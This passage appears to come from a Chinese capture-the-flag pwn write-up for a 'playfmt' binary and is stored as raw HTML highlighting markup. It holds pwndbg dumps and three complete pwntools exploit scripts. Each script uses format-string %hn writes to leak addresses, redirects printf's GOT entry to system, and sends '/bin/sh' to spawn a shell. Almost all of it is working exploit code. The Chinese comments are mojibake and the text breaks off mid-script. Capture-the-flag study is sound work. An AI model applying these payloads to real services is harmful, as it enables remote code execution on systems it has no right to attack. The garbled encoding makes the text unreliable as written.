0xf7eb1870 (_IO_stdfile_1_lock) â—‚â€” 0x0 EDI  0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db0 ESI  0x1 EBP  0xffa077d8 â€”â–¸ 0xffa077e8 â€”â–¸ 0xffa077f8 â—‚â€” 0x0 ESP  0xffa077c0 â€”â–¸ 0x804a060 (buf) â—‚â€” 0x31313225 ('%211') EIP  0x8048540 (do_fmt+69) â—‚â€” add    esp, 0x10â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€   0x804853b &lt;do_fmt+64>    call   printf@plt &lt;0x80483a0> â–º 0x8048540 &lt;do_fmt+69>    add    esp, 0x10   0x8048543 &lt;do_fmt+72>    jmp    do_fmt+6 &lt;0x8048501>    â†“   0x8048501 &lt;do_fmt+6>     sub    esp, 4   0x8048504 &lt;do_fmt+9>     push   0xc8   0x8048509 &lt;do_fmt+14>    push   buf &lt;0x804a060>   0x804850e &lt;do_fmt+19>    push   0   0x8048510 &lt;do_fmt+21>    call   read@plt &lt;0x8048390>   0x8048515 &lt;do_fmt+26>    add    esp, 0x10   0x8048518 &lt;do_fmt+29>    sub    esp, 4   0x804851b &lt;do_fmt+32>    push   4â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€00:0000â”‚ esp  0xffa077c0 â€”â–¸ 0x804a060 (buf) â—‚â€” 0x31313225 ('%211')01:0004â”‚      0xffa077c4 â€”â–¸ 0x8048640 â—‚â€” jno    0x80486b7 /* 'quit' */02:0008â”‚      0xffa077c8 â—‚â€” 0x403:000câ”‚      0xffa077cc â€”â–¸ 0x804857c (play+51) â—‚â€” add    esp, 0x1004:0010â”‚      0xffa077d0 â€”â–¸ 0x8048645 â—‚â€” cmp    eax, 0x3d3d3d3d05:0014â”‚      0xffa077d4 â€”â–¸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db006:0018â”‚ ebp  0xffa077d8 â€”â–¸ 0xffa077e8 â€”â–¸ 0xffa077f8 â—‚â€” 0x007:001câ”‚      0xffa077dc â€”â–¸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) â€”â–¸ 0xf7d37b30 (system) â—‚â€” sub    esp, 0xcâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â–º f 0  8048540 do_fmt+69   f 1  804a010 _GLOBAL_OFFSET_TABLE_+16   f 2 f7eb0d60 _IO_2_1_stdout_   f 3  804a012 _GLOBAL_OFFSET_TABLE_+18   f 4 f7eb03dc __exit_funcs   f 5 ffa07810   f 6 f7d15276 __libc_start_main+246pwndbg> stack 2500:0000â”‚ esp  0xffa077c0 â€”â–¸ 0x804a060 (buf) â—‚â€” 0x31313225 ('%211')01:0004â”‚      0xffa077c4 â€”â–¸ 0x8048640 â—‚â€” jno    0x80486b7 /* 'quit' */02:0008â”‚      0xffa077c8 â—‚â€” 0x403:000câ”‚      0xffa077cc â€”â–¸ 0x804857c (play+51) â—‚â€” add    esp, 0x1004:0010â”‚      0xffa077d0 â€”â–¸ 0x8048645 â—‚â€” cmp    eax, 0x3d3d3d3d05:0014â”‚      0xffa077d4 â€”â–¸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db006:0018â”‚ ebp  0xffa077d8 â€”â–¸ 0xffa077e8 â€”â–¸ 0xffa077f8 â—‚â€” 0x007:001câ”‚      0xffa077dc â€”â–¸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) â€”â–¸ 0xf7d37b30 (system) â—‚â€” sub    esp, 0xc08:0020â”‚      0xffa077e0 â€”â–¸ 0xf7eb0d60 (_IO_2_1_stdout_) â—‚â€” 0xfbad288709:0024â”‚      0xffa077e4 â—‚â€” 0x00a:0028â”‚      0xffa077e8 â€”â–¸ 0xffa077f8 â—‚â€” 0x00b:002câ”‚      0xffa077ec â€”â–¸ 0x804a012 (_GLOBAL_OFFSET_TABLE_+18) â—‚â€” 0xc870f7d30c:0030â”‚      0xffa077f0 â€”â–¸ 0xf7eb03dc (__exit_funcs) â€”â–¸ 0xf7eb11e0 (initial) â—‚â€” 0x00d:0034â”‚      0xffa077f4 â€”â–¸ 0xffa07810 â—‚â€” 0x10e:0038â”‚      0xffa077f8 â—‚â€” 0x00f:003câ”‚      0xffa077fc â€”â–¸ 0xf7d15276 (__libc_start_main+246) â—‚â€” add    esp, 0x1010:0040â”‚      0xffa07800 â—‚â€” 0x111:0044â”‚      0xffa07804 â€”â–¸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db012:0048â”‚      0xffa07808 â—‚â€” 0x013:004câ”‚      0xffa0780c â€”â–¸ 0xf7d15276 (__libc_start_main+246) â—‚â€” add    esp, 0x1014:0050â”‚      0xffa07810 â—‚â€” 0x115:0054â”‚      0xffa07814 â€”â–¸ 0xffa078a4 â€”â–¸ 0xffa077dc â€”â–¸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) â—‚â€” 0xf7d37b3016:0058â”‚      0xffa07818 â€”â–¸ 0xffa078ac â€”â–¸ 0xffa077ec â€”â–¸ 0x804a012 (_GLOBAL_OFFSET_TABLE_+18) â—‚â€” 0xc870f7d317:005câ”‚      0xffa0781c â—‚â€” 0x0... â†“pwndbg> gotGOT protection: Partial RELRO | GOT functions: 6[0x804a00c] read@GLIBC_2.0 -> 0xf7dd3c50 (read) â—‚â€” cmp    dword ptr gs:[0xc], 0[0x804a010] printf@GLIBC_2.0 -> 0xf7d37b30 (system) â—‚â€” sub    esp, 0xc[0x804a014] puts@GLIBC_2.0 -> 0xf7d5c870 (puts) â—‚â€” push   ebp[0x804a018] __libc_start_main@GLIBC_2.0 -> 0xf7d15180 (__libc_start_main) â—‚â€” push   ebp[0x804a01c] setvbuf@GLIBC_2.0 -> 0xf7d5cff0 (setvbuf) â—‚â€” push   ebp[0x804a020] strncmp@GLIBC_2.0 -> 0xf7e3a5d0 (__strncmp_sse4_2) â—‚â€” push   ebp'''</span><span class="token comment" spellcheck="true">#  gdb.attach(io, "b *do_fmt+64\nc")</span>payload <span class="token operator">=</span> <span class="token string">"%{}c%{}$hhn"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">16</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">,</span> <span class="token number">0xb</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">"%{}c%{}$hn"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">16</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x7</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">'44444444\0'</span>info<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"33333333"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"44444444"</span><span class="token punctuation">,</span> <span class="token string">"/bin/sh\0"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true">#ä½œè€…ï¼š23R3F</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./playfmt'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./playfmt'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/i386-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>printf_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span>system_libc <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>  printf_libc <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span>  p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"**********leak printf_got************"</span><span class="token punctuation">)</span> payload <span class="token operator">=</span> <span class="token string">'%6$x'</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>ebp2 <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>ebp1 <span class="token operator">=</span> ebp2 <span class="token operator">-</span> <span class="token number">0x10</span>fmt_7 <span class="token operator">=</span> ebp2 <span class="token operator">-</span><span class="token number">0x0c</span>fmt_11 <span class="token operator">=</span> ebp2 <span class="token operator">+</span> <span class="token number">0x04</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"printf_got-->p[%s]"</span><span class="token operator">%</span>hex<span class="token punctuation">(</span>printf_got<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"ebp_1-->p[%s]"</span><span class="token operator">%</span>hex<span class="token punctuation">(</span>ebp1<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"ebp_2-->p[%s]"</span><span class="token operator">%</span>hex<span class="token punctuation">(</span>ebp2<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"fmt_7-->p[%s]"</span><span class="token operator">%</span>hex<span class="token punctuation">(</span>fmt_7<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"fmt_11-->p[%s]"</span><span class="token operator">%</span>hex<span class="token punctuation">(</span>fmt_11<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>fmt_7 <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%6$hn'</span><span class="token comment" spellcheck="true">#ebp2 = fmt_7</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#ç”±äºebp2å·²ç»æŒ‡å‘äº†fmt_7ï¼Œæ‰€ä»¥ä¿®æ”¹åç§»é‡10å¤„çš„ebp2å³ä¿®æ”¹fmt_7</span>payload <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>printf_got <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%10$hn'</span><span class="token comment" spellcheck="true">#fmt_7 = prinf_got</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"23r3f"</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"23r3f"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span><span class="token triple-quoted-string string">'''è¿™ä¸ªå¾ªç¯ç”¨äºä¿è¯æ‰€æœ‰çš„å­—èŠ‚éƒ½è¢«è¾“å‡ºï¼Œå› ä¸ºrecvï¼ˆï¼‰ä¸€æ¬¡æœ€å¤šåªèƒ½æ¥æ”¶0x1000ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥è¦è¿›è¡Œå¤šæ¬¡recvï¼ˆï¼‰æ‰èƒ½ä¿è¯å…¨éƒ¨å­—èŠ‚éƒ½è¾“å‡ºä»¥ä¾¿è¿›è¡Œä¸‹é¢çš„æ“ä½œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¦æ„é€ ä¸€ä¸ªå­—ç¬¦ä¸²â€œ23r3fâ€æ¥ä½œæ ‡å¿—ï¼Œè¿”å›çš„å¤§é‡å­—ç¬¦ä¸²ä¸­å¦‚æœåŒ…å«äº†è¿™ä¸ªå­—ç¬¦ä¸²é‚£ä¹ˆè¯´æ˜ä¹‹å‰æ„é€ çš„%nå†™å…¥å·²ç»å®Œæˆ'''</span> payload <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>fmt_11 <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%6$hn'</span><span class="token comment" spellcheck="true">#ebp2 = fmt_11</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span><span class="token punctuation">(</span>printf_got<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%10$hn'</span><span class="token comment" spellcheck="true">#fmt_11 = prinf_got + 2</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"23r3f"</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"23r3f"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"******leaking the print_got_add*********"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'aaaa%7$s'</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"aaaa"</span><span class="token punctuation">)</span>printf_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"print_got_add is:[%s]"</span><span class="token operator">%</span>hex<span class="token punctuation">(</span>printf_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> printf_addr <span class="token operator">-</span> printf_libc <span class="token operator">+</span> system_libclog<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"system_add is:[%s]"</span><span class="token operator">%</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#pause()</span>payload <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span>str<span class="token punctuation">(</span>system_addr <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">'c%7$hn'</span>payload <span class="token operator">+=</span> <span class="token string">'%'</span> <span class="token operator">+</span>str<span class="token punctuation">(</span><span class="token punctuation">(</span>system_addr<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span>system_addr <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">'c%11$hn'</span><span class="token triple-quoted-string string">'''è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬æŠŠsystemçš„åœ°å€çš„å‰åä¸¤ä¸ªå­—èŠ‚åˆ†åˆ«å†™åˆ°fmt-7å’Œfmt-11ä¸­ï¼Œåœ¨å†™å…¥åä¸¤ä¸ªå­—èŠ‚çš„æ—¶å€™è¦æ³¨æ„å‡å»å‰é¢è¾“å…¥çš„(system_addr &amp;0xffff))ï¼Œè¿™æ˜¯å› ä¸º%nå†™å…¥æ“ä½œæ˜¯ç®—ç´¯ç§¯è¾“å…¥çš„å­—ç¬¦ä¸ªæ•°'''</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"23r3f"</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"23r3f"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''è¿™ä¸ªæ—¶å€™è¾“å…¥å‚æ•°åˆ°æ ˆä¸­ï¼Œæœ¬æ¥ä¸‹ä¸€æ­¥ç¨‹åºä¼šè°ƒç”¨printfå‡½æ•°ï¼Œä½†æ˜¯æ­¤æ—¶printfå‡½æ•°çš„gotè¡¨å·²ç»è¢«ä¿®æ”¹ä¸ºsystemçš„åœ°å€äº†ï¼Œæ­¤æ—¶å°±ä¼šæ‰§è¡Œsystemå¹¶ä¸”ä»æ ˆä¸­å–bin/shå‚æ•°äºæ˜¯å°±è¿™æ ·getshell'''</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#veritas501 --exp</span><span class="token comment" spellcheck="true">#coding = utf8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'terminator'</span><span class="token punctuation">,</span><span class="token string">'-x'</span><span class="token punctuation">,</span><span class="token string">'bash'</span><span class="token punctuation">,</span><span class="token string">'-c'</span><span class="token punctuation">]</span>p_printf <span class="token operator">=</span> <span class="token number">0x0804A010</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc.so'</span><span class="token punctuation">)</span>cn <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./playfmt'</span><span class="token punctuation">)</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>pay <span class="token operator">=</span> <span class="token string">'%6$x'</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span>p_ebp2 <span class="token operator">=</span> int<span class="token punctuation">(</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#10</span>p_7 <span class="token operator">=</span> p_ebp2<span class="token number">-0xc</span><span class="token comment" spellcheck="true">#7</span>p_11 <span class="token operator">=</span> p_ebp2<span class="token operator">+</span><span class="token number">4</span><span class="token comment" spellcheck="true">#11</span>p_ebp1 <span class="token operator">=</span> p_ebp2<span class="token number">-0x10</span><span class="token comment" spellcheck="true">#6</span>pay <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>p_7<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c%6$hn\x00"</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#set p_ebp2->p_7</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>pay <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>p_printf<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c%10$hn\x00"</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#set p_7->p_printf</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    cn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"here\x00"</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"here"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>pay <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>p_11<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c%6$hn\x00"</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#set p_ebp2->p_11</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>pay <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span><span class="token punctuation">(</span>p_printf<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c%10$hn\x00"</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#set p_11->p_printf+2</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'here\x00'</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    cn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"here\x00"</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"here"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>pay <span class="token operator">=</span> <span class="token string">"aaaa%7$s\x00"</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>printf <span class="token operator">=</span> u32<span class="token punctuation">(</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>printf<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#leak printf</span>system <span class="token operator">=</span> printf<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>system<span class="token punctuation">)</span>pay <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>system<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c%7$hn"</span> pay <span class="token operator">+=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span><span class="token punctuation">(</span>system<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span>system<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c%11$hn\x00"</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#hijack printf->system</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    cn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"here\x00"</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"here"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>cn<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token 